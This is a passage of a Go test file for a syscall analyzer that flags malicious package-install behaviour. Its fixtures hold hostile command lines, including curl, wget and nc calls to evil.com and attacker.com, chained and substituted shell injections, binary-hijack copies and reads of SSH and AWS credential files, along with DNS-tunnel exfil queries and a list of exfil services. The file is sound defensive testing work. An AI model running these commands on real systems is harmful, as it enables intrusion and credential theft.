package analyzer

import (
	"reflect"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/RalianENG/kojuto/internal/types"
)

const (
	riskCritical = "critical"
	riskHigh     = "high"
	riskMedium   = "medium"
	riskNone     = "none"
)

func TestAnalyze_Clean(t *testing.T) {
	verdict, filtered := Analyze(nil)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean, got %s", verdict)
	}

	if len(filtered) != 0 {
		t.Errorf("expected 0 filtered events, got %d", len(filtered))
	}

	verdict, _ = Analyze([]types.SyscallEvent{})
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for empty slice, got %s", verdict)
	}
}

func TestAnalyze_Suspicious(t *testing.T) {
	events := []types.SyscallEvent{
		{
			Timestamp: time.Now(),
			PID:       1234,
			Syscall:   types.EventConnect,
			Family:    2,
			DstAddr:   "203.0.113.50",
			DstPort:   443,
		},
	}

	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious, got %s", verdict)
	}

	if len(filtered) != 1 {
		t.Errorf("expected 1 suspicious event, got %d", len(filtered))
	}
}

func TestAnalyze_FiltersLoopback(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "127.0.0.1", DstPort: 80, Family: 2},
		{Syscall: types.EventConnect, DstAddr: "::1", DstPort: 80, Family: 10},
		{Syscall: types.EventSendto, DstAddr: "0.0.0.0", DstPort: 53, Family: 2},
	}

	verdict, filtered := Analyze(events)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean after filtering loopback, got %s", verdict)
	}

	if len(filtered) != 0 {
		t.Errorf("expected 0 suspicious events, got %d", len(filtered))
	}
}

func TestAnalyze_FiltersBenignExec(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/python", Cmdline: "python setup.py"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo hello"},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for benign exec, got %s", verdict)
	}
}

func TestAnalyze_SuspiciousExec(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl http://evil.com/payload"},
	}

	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for curl, got %s", verdict)
	}

	if len(filtered) != 1 {
		t.Errorf("expected 1 suspicious event, got %d", len(filtered))
	}
}

func TestAnalyze_ShellCBenign(t *testing.T) {
	// pip/setuptools routinely call sh -c with compiler and file commands.
	benignCases := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c gcc -o output.o input.c"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo hello"},
		{Syscall: types.EventExecve, Comm: "/usr/bin/bash", Cmdline: "bash -c pkg-config --libs python3"},
		{Syscall: types.EventExecve, Comm: "/bin/dash", Cmdline: "dash -c command -v gcc"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c 'cp file1 file2'"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c \"mkdir -p /install/lib\""},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c test -f /usr/include/stdio.h"},
		// Benign command chains (all segments are safe commands).
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c 'mkdir -p /install/lib && cp file1 /install/lib/'"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c gcc -o out.o in.c && strip out.o"},
		// File ops targeting non-trusted directories are fine.
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cp file1 /install/lib/file1"},
	}

	verdict, filtered := Analyze(benignCases)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for benign sh -c, got %s with %d events", verdict, len(filtered))
		for _, e := range filtered {
			t.Logf("  flagged: %s %q", e.Comm, e.Cmdline)
		}
	}
}

func TestAnalyze_ShellCSuspicious(t *testing.T) {
	// Attack vectors that abuse sh -c to execute arbitrary code.
	cases := []struct {
		name string
		evt  types.SyscallEvent
	}{
		{
			name: "sh -c runs /tmp binary",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c /tmp/malware"},
		},
		{
			name: "sh -c runs unknown binary",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c /usr/local/sbin/backdoor --exfil"},
		},
		{
			name: "sh -c runs wget",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c wget http://evil.com -O /tmp/x"},
		},
		{
			name: "sh -c runs curl",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c curl http://evil.com/payload"},
		},
		{
			name: "dash -c runs nc",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/dash", Cmdline: "dash -c nc attacker.com 4444"},
		},
		{
			name: "bash -c runs python",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/usr/bin/bash", Cmdline: "bash -c python3 -c 'import os; os.system(\"id\")'"},
		},
		// Command chain attacks: safe command followed by malicious command.
		{
			name: "semicolon chain: echo; curl",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo x; curl http://evil.com"},
		},
		{
			name: "pipe chain: echo | nc",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo payload | nc attacker.com 4444"},
		},
		{
			name: "and chain: true && wget",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c true && wget http://evil.com -O /tmp/x"},
		},
		{
			name: "or chain: false || /tmp/malware",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c false || /tmp/malware"},
		},
		// env abuse: env can run arbitrary commands.
		{
			name: "env runs curl",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c env curl http://evil.com"},
		},
		// find -exec abuse.
		{
			name: "find -exec runs payload",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c find /tmp -exec /tmp/payload {} ;"},
		},
		// Backtick command substitution.
		{
			name: "backtick substitution",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo `curl evil.com`"},
		},
		// $() command substitution.
		{
			name: "dollar-paren substitution",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo $(curl evil.com)"},
		},
		// File ops targeting trusted directories (binary hijack).
		{
			name: "cp payload to /usr/local/bin",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cp /tmp/payload /usr/local/bin/python3"},
		},
		{
			name: "ln -s to /usr/bin",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c ln -s /tmp/malware /usr/bin/node"},
		},
		{
			name: "mv to /bin",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c mv /tmp/backdoor /bin/sh"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			verdict, _ := Analyze([]types.SyscallEvent{tc.evt})
			if verdict != types.VerdictSuspicious {
				t.Errorf("expected suspicious, got %s for: %s", verdict, tc.evt.Cmdline)
			}
		})
	}
}

func TestAnalyze_PythonCInlineCode(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/python3", Cmdline: "python3 -c import os; os.system('id')"},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for python3 -c, got %s", verdict)
	}
}

func TestAnalyze_BasenameSpoofing(t *testing.T) {
	// Attacker copies malware to /tmp/python3 — path must be checked, not just basename.
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/tmp/python3", Cmdline: "python3 setup.py"},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for /tmp/python3 (basename spoofing), got %s", verdict)
	}
}

func TestAnalyze_EmptyDstAddr(t *testing.T) {
	// A connect event with empty address means the parser failed.
	// Must NOT be treated as benign.
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "", DstPort: 443, Family: 2},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for empty DstAddr, got %s", verdict)
	}
}

func TestAnalyze_OpenatSensitive(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", OpenFlags: "O_RDONLY"},
	}

	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for SSH key access, got %s", verdict)
	}
	if len(filtered) != 1 {
		t.Errorf("expected 1 suspicious event, got %d", len(filtered))
	}
}

func TestAnalyze_RenameTrustedBinary(t *testing.T) {
	cases := []struct {
		name    string
		dstPath string
		want    string
	}{
		{"python3 hijack", "/usr/local/bin/python3", types.VerdictSuspicious},
		{"node hijack", "/usr/local/bin/node", types.VerdictSuspicious},
		{"sh hijack", "/bin/sh", types.VerdictSuspicious},
		{"new CLI script", "/usr/local/bin/my-tool", types.VerdictClean},
		{"install dir", "/install/lib/module.so", types.VerdictClean},
		{"tmp rename", "/tmp/a", types.VerdictClean},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			events := []types.SyscallEvent{
				{Syscall: types.EventRename, SrcPath: "/tmp/payload", DstPath: tc.dstPath},
			}
			verdict, _ := Analyze(events)
			if verdict != tc.want {
				t.Errorf("expected %s for dst=%s, got %s", tc.want, tc.dstPath, verdict)
			}
		})
	}
}

func TestAnalyze_BindListenAccept(t *testing.T) {
	// Server socket operations are always suspicious.
	for _, syscall := range []string{types.EventBind, types.EventListen, types.EventAccept} {
		events := []types.SyscallEvent{
			{Syscall: syscall, DstAddr: "0.0.0.0", DstPort: 4444},
		}
		verdict, _ := Analyze(events)
		if verdict != types.VerdictSuspicious {
			t.Errorf("expected suspicious for %s, got %s", syscall, verdict)
		}
	}
}

func TestAnalyze_DNSTunneling(t *testing.T) {
	// DNS tunneling: sendto to loopback:53 with suspicious query.
	// Using loopback so only the DNS query content determines the verdict
	// (loopback is normally benign, but tunneling overrides that).
	tunnelCases := []struct {
		name  string
		query string
		want  string
	}{
		// Suspicious: base64-encoded data in subdomain.
		{"base64 exfil", "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.evil.com", types.VerdictSuspicious},
		// Suspicious: hex-encoded data in subdomain.
		{"hex exfil", "68656c6c6f20776f726c6420746869732069732061.evil.com", types.VerdictSuspicious},
		// Suspicious: very long query.
		{"long query", "aaaaaaaaaa.bbbbbbbbbb.cccccccccc.dddddddddd.eeeeeeeeee.ffffffffff.gggggggggg.hhhhhhhhhh.evil.com", types.VerdictSuspicious},
		// Clean: normal domain lookup (short labels, low entropy).
		{"normal domain", "www.google.com", types.VerdictClean},
		// Clean: pypi.org (benign suffix).
		{"pypi lookup", "files.pythonhosted.org", types.VerdictClean},
		// Clean: npm registry.
		{"npm lookup", "registry.npmjs.org", types.VerdictClean},
		// Clean: short subdomain.
		{"short sub", "api.github.com", types.VerdictClean},
		// Clean: only two labels (no subdomain to tunnel through).
		{"two labels", "evil.com", types.VerdictClean},
	}

	for _, tc := range tunnelCases {
		t.Run(tc.name, func(t *testing.T) {
			events := []types.SyscallEvent{
				{Syscall: types.EventSendto, DstAddr: "127.0.0.1", DstPort: 53, Family: 2, DNSQuery: tc.query},
			}
			verdict, _ := Analyze(events)
			if verdict != tc.want {
				t.Errorf("expected %s for query=%q, got %s", tc.want, tc.query, verdict)
			}
		})
	}
}

func TestShannonEntropy(t *testing.T) {
	// Low entropy: repeated character.
	if e := shannonEntropy("aaaaaaa"); e > 0.1 {
		t.Errorf("expected low entropy for 'aaaaaaa', got %f", e)
	}

	// High entropy: random-looking base64.
	if e := shannonEntropy("aGVsbG8gd29ybGQ"); e < 3.0 {
		t.Errorf("expected high entropy for base64, got %f", e)
	}

	// Empty string.
	if e := shannonEntropy(""); e != 0 {
		t.Errorf("expected 0 entropy for empty string, got %f", e)
	}
}

func TestAnalyze_SedExcluded(t *testing.T) {
	// sed is excluded from benignPaths because GNU sed -e can execute shell commands.
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/sed", Cmdline: "sed -e 1e cat /etc/passwd"},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for sed, got %s", verdict)
	}
}

// ---------------------------------------------------------------------------
// GenerateSummary
// ---------------------------------------------------------------------------

func TestGenerateSummary_Clean(t *testing.T) {
	s := GenerateSummary(types.VerdictClean, nil)
	if s.RiskLevel != riskNone {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskNone)
	}
	if s.Description == "" {
		t.Error("expected non-empty description for clean verdict")
	}
}

func TestGenerateSummary_Inconclusive(t *testing.T) {
	s := GenerateSummary(types.VerdictInconclusive, nil)
	if s.RiskLevel != riskMedium {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskMedium)
	}
	if s.Remediation == "" {
		t.Error("expected non-empty remediation for inconclusive verdict")
	}
}

func TestGenerateSummary_C2(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "203.0.113.50", DstPort: 443, Category: types.CategoryC2},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskCritical {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
	}
	found := false
	for _, c := range s.Categories {
		if c == types.CategoryC2 {
			found = true
		}
	}
	if !found {
		t.Errorf("expected categories to include %q, got %v", types.CategoryC2, s.Categories)
	}
}

func TestGenerateSummary_CredentialAccess(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", Category: types.CategoryCredentialAccess},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskCritical {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
	}
	if !strings.Contains(s.Remediation, "rotate") {
		t.Errorf("remediation should mention 'rotate', got %q", s.Remediation)
	}
}

func TestGenerateSummary_CodeExecutionOnly(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl http://evil.com", Category: types.CategoryCodeExecution},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskMedium {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskMedium)
	}
}

func TestGenerateSummary_BinaryHijack(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventRename, SrcPath: "/tmp/payload", DstPath: "/usr/local/bin/python3", Category: types.CategoryBinaryHijack},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskHigh {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskHigh)
	}
}

// ---------------------------------------------------------------------------
// classify (tested through Analyze)
// ---------------------------------------------------------------------------

func TestClassify_Connect(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "203.0.113.50", DstPort: 443, Family: 2},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryC2 {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryC2)
	}
}

func TestClassify_SendtoWithDNS(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventSendto, DstAddr: "8.8.8.8", DstPort: 53, Family: 2,
			DNSQuery: "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.evil.com"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryDNSTunnel {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryDNSTunnel)
	}
}

func TestClassify_SendtoWithoutDNS(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventSendto, DstAddr: "203.0.113.50", DstPort: 8080, Family: 2},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryC2 {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryC2)
	}
}

func TestClassify_Openat(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.aws/credentials", OpenFlags: "O_RDONLY"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryCredentialAccess {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryCredentialAccess)
	}
}

func TestClassify_Rename(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventRename, SrcPath: "/tmp/payload", DstPath: "/usr/local/bin/python3"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryBinaryHijack {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryBinaryHijack)
	}
}

func TestClassify_BindListenAccept(t *testing.T) {
	for _, syscall := range []string{types.EventBind, types.EventListen, types.EventAccept} {
		t.Run(syscall, func(t *testing.T) {
			events := []types.SyscallEvent{
				{Syscall: syscall, DstAddr: "0.0.0.0", DstPort: 4444},
			}
			_, filtered := Analyze(events)
			if len(filtered) != 1 {
				t.Fatalf("expected 1 event for %s, got %d", syscall, len(filtered))
			}
			if filtered[0].Category != types.CategoryBackdoor {
				t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryBackdoor)
			}
		})
	}
}

func TestClassify_ExecvePythonC(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/python3", Cmdline: "python3 -c import os; os.system('id')"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryCodeExecution {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryCodeExecution)
	}
}

// ---------------------------------------------------------------------------
// portStr
// ---------------------------------------------------------------------------

func TestPortStr(t *testing.T) {
	if got := portStr(0); got != "?" {
		t.Errorf("portStr(0) = %q, want %q", got, "?")
	}
	if got := portStr(443); got != "443" {
		t.Errorf("portStr(443) = %q, want %q", got, "443")
	}
}

// ---------------------------------------------------------------------------
// truncate
// ---------------------------------------------------------------------------

func TestTruncate(t *testing.T) {
	short := "hello"
	if got := truncate(short, 10); got != "hello" {
		t.Errorf("truncate(%q, 10) = %q, want %q", short, got, "hello")
	}

	long := "abcdefghij"
	if got := truncate(long, 5); got != "abcde..." {
		t.Errorf("truncate(%q, 5) = %q, want %q", long, got, "abcde...")
	}

	exact := "abcde"
	if got := truncate(exact, 5); got != "abcde" {
		t.Errorf("truncate(%q, 5) = %q, want %q", exact, got, "abcde")
	}
}

func TestHasAllowedDir(t *testing.T) {
	allowed := []string{"/usr/bin/", "/usr/local/bin/", "/bin/"}
	for _, d := range allowed {
		if !hasAllowedDir(d) {
			t.Errorf("hasAllowedDir(%q) = false, want true", d)
		}
	}
	disallowed := []string{"/tmp/", "/sbin/", "/home/dev/", ""}
	for _, d := range disallowed {
		if hasAllowedDir(d) {
			t.Errorf("hasAllowedDir(%q) = true, want false", d)
		}
	}
}

func TestAnalyze_ClassifiesReasonField(t *testing.T) {
	// Verify that Analyze populates Reason field on suspicious events.
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "1.2.3.4", DstPort: 443, Family: 2},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Reason == "" {
		t.Error("expected non-empty Reason after Analyze")
	}
}

func TestGenerateSummary_DNSTunnel(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventSendto, Category: types.CategoryDNSTunnel},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskHigh {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskHigh)
	}
}

func TestGenerateSummary_Backdoor(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventBind, Category: types.CategoryBackdoor},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskCritical {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
	}
}

func TestGenerateSummary_DataExfil(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventSendto, Category: types.CategoryDataExfil},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskCritical {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskCritical)
	}
}

// ---------------------------------------------------------------------------
// classifyOpenat (via Analyze)
// ---------------------------------------------------------------------------

func TestClassify_OpenatRead(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.aws/credentials", OpenFlags: "O_RDONLY"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryCredentialAccess {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryCredentialAccess)
	}
	if !strings.Contains(filtered[0].Reason, "Read") {
		t.Errorf("reason should mention Read, got %q", filtered[0].Reason)
	}
}

func TestClassify_OpenatWriteSensitive(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", OpenFlags: "O_WRONLY"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	// Write to /home/ is classified as persistence (sandbox structural
	// whitelist: pip/npm never write to the user home directory).
	if filtered[0].Category != types.CategoryPersistence {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryPersistence)
	}
	if !strings.Contains(filtered[0].Reason, "Write") {
		t.Errorf("reason should mention Write, got %q", filtered[0].Reason)
	}
}

func TestClassify_SandboxDetectionPaths(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantCat string
	}{
		{"proc self status", "/proc/self/status", types.CategoryEvasion},
		{"proc self maps", "/proc/self/maps", types.CategoryEvasion},
		{"proc self cgroup", "/proc/self/cgroup", types.CategoryEvasion},
		{"proc pid comm", "/proc/42/comm", types.CategoryEvasion},
		{"sys class net", "/sys/class/net", types.CategoryEvasion},
		{"ssh key read", "/home/dev/.ssh/id_rsa", types.CategoryCredentialAccess},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			events := []types.SyscallEvent{
				{Syscall: types.EventOpenat, FilePath: tc.path, OpenFlags: "O_RDONLY"},
			}
			_, filtered := Analyze(events)
			if len(filtered) != 1 {
				t.Fatalf("expected 1 event, got %d", len(filtered))
			}
			if filtered[0].Category != tc.wantCat {
				t.Errorf("category = %q, want %q", filtered[0].Category, tc.wantCat)
			}
		})
	}
}

func TestMatchExfilService(t *testing.T) {
	tests := []struct {
		domain string
		want   string
	}{
		{"discord.com", "Discord"},
		{"cdn.discordapp.com", "Discord"},
		{"api.telegram.org", "Telegram"},
		{"pastebin.com", "Pastebin"},
		{"webhook.site", "Webhook.site"},
		{"ipinfo.io", "ipinfo.io"},
		{"pypi.org", ""},    // not exfil
		{"google.com", ""},  // not exfil
		{"example.com", ""}, // not exfil
	}
	for _, tc := range tests {
		got := matchExfilService(tc.domain)
		if got != tc.want {
			t.Errorf("matchExfilService(%q) = %q, want %q", tc.domain, got, tc.want)
		}
	}
}

func TestCollectExecutedPaths(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/tmp/.payload", Cmdline: "/tmp/.payload"},
		{Syscall: types.EventExecve, Comm: "/usr/bin/python3", Cmdline: "python3 /tmp/dropper.py"},
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa"},
	}
	paths := collectExecutedPaths(events)

	if !paths["/tmp/.payload"] {
		t.Error("expected /tmp/.payload in executed paths")
	}
	if !paths["/tmp/dropper.py"] {
		t.Error("expected /tmp/dropper.py in executed paths (from cmdline)")
	}
	if paths["/home/dev/.ssh/id_rsa"] {
		t.Error("/home/dev/.ssh/id_rsa should NOT be in executed paths")
	}
}

func TestClassify_HomeDirWrite(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.config/systemd/user/evil.service", OpenFlags: "O_WRONLY|O_CREAT"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryPersistence {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryPersistence)
	}
	if !strings.Contains(filtered[0].Reason, "home directory") {
		t.Errorf("reason should mention home directory, got %q", filtered[0].Reason)
	}
}

func TestClassify_MemoryExecution(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventMmap, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", MemFlags: "MAP_PRIVATE|MAP_ANONYMOUS"},
		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 2 {
		t.Fatalf("expected 2 events, got %d", len(filtered))
	}
	for i, evt := range filtered {
		if evt.Category != types.CategoryMemExec {
			t.Errorf("event %d: category = %q, want %q", i, evt.Category, types.CategoryMemExec)
		}
	}
}

func TestClassify_AntiForensics(t *testing.T) {
	// create→execute→delete should be classified as anti_forensics
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/tmp/.payload", Cmdline: "/tmp/.payload"},
		{Syscall: types.EventUnlink, FilePath: "/tmp/.payload"},
	}
	_, filtered := Analyze(events)

	var hasAntiForensics bool
	for _, evt := range filtered {
		if evt.Category == types.CategoryAntiForensics {
			hasAntiForensics = true
		}
	}
	if !hasAntiForensics {
		t.Error("expected anti_forensics category for create→execute→delete pattern")
	}
}

func TestClassify_AntiForensics_NoExec(t *testing.T) {
	// delete without execute → NOT anti_forensics (filtered by analyzer)
	events := []types.SyscallEvent{
		{Syscall: types.EventUnlink, FilePath: "/tmp/tempfile"},
	}
	_, filtered := Analyze(events)

	for _, evt := range filtered {
		if evt.Category == types.CategoryAntiForensics {
			t.Error("unlink without matching execve should NOT be anti_forensics")
		}
	}
}

func TestClassify_OpenatWriteBashrc(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.bashrc", OpenFlags: "O_WRONLY"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryPersistence {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryPersistence)
	}
}

func TestClassify_OpenatWriteZshrc(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.zshrc", OpenFlags: "O_RDWR"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryPersistence {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryPersistence)
	}
}

func TestGenerateSummary_Persistence(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, Category: types.CategoryPersistence},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskHigh {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskHigh)
	}
	if !strings.Contains(s.Remediation, ".bashrc") {
		t.Errorf("remediation should mention .bashrc, got %q", s.Remediation)
	}
}

// ---------------------------------------------------------------------------
// DoH detection
// ---------------------------------------------------------------------------

func TestClassify_DoH_Cloudflare(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "1.1.1.1", DstPort: 443, Family: 2},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryDNSTunnel {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryDNSTunnel)
	}
	if !strings.Contains(filtered[0].Reason, "DNS-over-HTTPS") {
		t.Errorf("reason should mention DNS-over-HTTPS, got %q", filtered[0].Reason)
	}
}

func TestClassify_DoH_Google(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "8.8.8.8", DstPort: 443, Family: 2},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryDNSTunnel {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryDNSTunnel)
	}
}

func TestClassify_DoH_NotPort443(t *testing.T) {
	// DoH server on port 53 = regular DNS, not DoH.
	events := []types.SyscallEvent{
